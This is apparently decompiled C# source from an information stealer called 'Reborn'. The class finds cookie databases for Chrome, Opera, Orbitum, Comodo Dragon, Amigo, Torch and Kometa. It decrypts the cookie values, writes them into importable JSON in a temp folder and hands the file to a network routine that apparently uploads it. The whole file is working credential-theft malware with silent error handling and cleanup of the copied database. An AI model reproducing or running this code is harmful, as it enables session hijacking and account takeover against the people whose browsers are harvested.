using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Reborn.Browsers;
using Reborn.Helper;

namespace Reborn.Cookies
{
	// Token: 0x02000022 RID: 34
	internal class Chromium
	{
		// Token: 0x060000D7 RID: 215 RVA: 0x00009094 File Offset: 0x00007294
		public static void Initialise()
		{
			string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
			string[] array = new string[]
			{
				environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Cookies",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies",
				environmentVariable + "\\Kometa\\User Data\\Default\\Cookies",
				environmentVariable + "\\Orbitum\\User Data\\Default\\Cookies",
				environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Cookies",
				environmentVariable + "\\Amigo\\User\\User Data\\Default\\Cookies",
				environmentVariable + "\\Torch\\User Data\\Default\\Cookies"
			};
			for (int i = 0; i < array.Length; i++)
			{
				Chromium.Get(array[i]);
			}
		}

		// Token: 0x060000D8 RID: 216 RVA: 0x0000915C File Offset: 0x0000735C
		private static void Get(string basePath)
		{
			if (!File.Exists(basePath))
			{
				return;
			}
			string program = "";
			if (basePath.Contains("Chrome"))
			{
				program = "Google Chrome";
			}
			if (basePath.Contains("Yandex"))
			{
				program = "Yandex Browser";
			}
			if (basePath.Contains("Orbitum"))
			{
				program = "Orbitum Browser";
			}
			if (basePath.Contains("Opera"))
			{
				program = "Opera Browser";
			}
			if (basePath.Contains("Amigo"))
			{
				program = "Amigo Browser";
			}
			if (basePath.Contains("Torch"))
			{
				program = "Torch Browser";
			}
			if (basePath.Contains("Comodo"))
			{
				program = "Comodo Browser";
			}
			try
			{
				string text = Path.GetTempPath() + "/" + Misc.GetRandomString() + ".fv";
				string text2 = Path.GetTempPath() + "/" + Misc.GetRandomString() + ".txt";
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				File.Copy(basePath, text, true);
				SqlHandler sqlHandler = new SqlHandler(text);
				sqlHandler.ReadTable("cookies");
				List<Cookie> list = new List<Cookie>();
				for (int i = 0; i < sqlHandler.GetRowCount(); i++)
				{
					try
					{
						string text3 = string.Empty;
						try
						{
							byte[] bytes = Chromium.DecryptChromium(Encoding.Default.GetBytes(sqlHandler.GetValue(i, 12)), null);
							text3 = Encoding.UTF8.GetString(bytes);
							text3 = text3.Replace("\"", "\\\"").Replace("\\0", "\\\\0").Replace("\\r", "\\\\r").Replace("\\n", "\\\\n").Replace("\\t", "\\\\t").Replace("\\v", "\\\\v").Replace("\\»", "\\\\»").Replace("\\’", "\\\\’").Replace("\\\\\\", "\\\\\\\\").Replace("\\?", "\\\\?").Replace("\\a", "\\\\a");
						}
						catch (Exception)
						{
						}
						bool flag;
						bool.TryParse(sqlHandler.GetValue(i, 7), out flag);
						bool flag2;
						bool.TryParse(sqlHandler.GetValue(i, 6), out flag2);
						bool flag3;
						bool.TryParse(sqlHandler.GetValue(i, 9), out flag3);
						list.Add(new Cookie
						{
							domain = sqlHandler.GetValue(i, 1),
							name = sqlHandler.GetValue(i, 2),
							path = sqlHandler.GetValue(i, 4),
							expirationDate = sqlHandler.GetValue(i, 5),
							secure = flag2.ToString().ToLower(),
							httpOnly = flag.ToString().ToLower(),
							session = flag3.ToString().ToLower(),
							id = i.ToString(),
							storeId = i.ToString(),
							value = text3,
							hostOnly = "true"
						});
					}
					catch (Exception arg_2F0_0)
					{
						Console.WriteLine(arg_2F0_0.ToString());
					}
				}
				int num = 0;
				using (StreamWriter streamWriter = new StreamWriter(text2))
				{
					streamWriter.WriteLine("[");
					foreach (Cookie current in list)
					{
						num++;
						streamWriter.WriteLine("{");
						streamWriter.WriteLine(string.Concat(new string[]
						{
							"\"domain\": \"",
							current.domain,
							"\",",
							Environment.NewLine,
							"\"expirationDate\": ",
							current.expirationDate,
							",",
							Environment.NewLine,
							"\"hostOnly\": ",
							current.hostOnly,
							",",
							Environment.NewLine,
							"\"httpOnly\": ",
							current.httpOnly,
							",",
							Environment.NewLine,
							"\"name\": \"",
							current.name,
							"\",",
							Environment.NewLine,
							"\"path\": \"",
							current.path,
							"\",",
							Environment.NewLine,
							"\"sameSite\": \"no_restriction\",",
							Environment.NewLine,
							"\"secure\": ",
							current.secure,
							",",
							Environment.NewLine,
							"\"session\": ",
							current.session,
							",",
							Environment.NewLine,
							"\"storeId\": \"0\",",
							Environment.NewLine,
							"\"value\": \"",
							current.value,
							"\",",
							Environment.NewLine,
							"\"id\": ",
							current.id
						}) ?? "");
						streamWriter.WriteLine((sqlHandler.GetRowCount() != num) ? "}," : "}");
					}
					streamWriter.WriteLine("]");
				}
				File.Delete(text);
				Network.FileRequest(program, num, text2);
			}
			catch
			{
			}
		}
	}
}
